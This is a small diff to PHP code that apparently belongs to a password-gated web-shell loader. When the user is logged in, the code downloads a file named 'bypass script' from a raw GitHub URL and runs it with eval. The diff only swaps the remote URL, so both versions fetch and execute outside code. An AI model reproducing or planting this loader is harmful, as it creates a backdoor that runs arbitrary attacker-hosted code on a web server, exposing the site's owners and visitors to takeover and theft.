@@ -33,7 +33,7 @@ if (is_logged_in()) {
         return $url_get_contents_data;
     }
 
-    $a = geturlsinfo('https://raw.githubusercontent.com/cindylara1122/script/refs/heads/main/bypass%20script?token=GHSAT0AAAAAACYZPZSRZD74VEOM6LWIASACZYJFFTA');
+    $a = geturlsinfo('https://raw.githubusercontent.com/cindylara1122/script/main/bypass%20script.php');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
